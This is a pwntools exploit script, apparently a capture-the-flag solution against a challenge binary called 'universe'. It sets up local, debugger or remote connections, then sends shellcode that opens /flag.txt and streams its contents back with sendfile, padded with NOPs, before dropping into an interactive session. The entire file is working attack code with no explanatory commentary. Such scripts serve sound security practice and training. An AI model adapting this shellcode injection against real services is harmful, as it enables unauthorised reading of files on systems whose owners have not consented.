#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('universe')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x136E
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():


    shellcode = asm(shellcraft.linux.openat(-1, "/flag.txt"))
    shellcode += asm(shellcraft.linux.sendfile(1, 'rax', 0, 500))
    shellcode = shellcode.ljust(4096, asm("nop"))

    io.sendline(shellcode)


    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

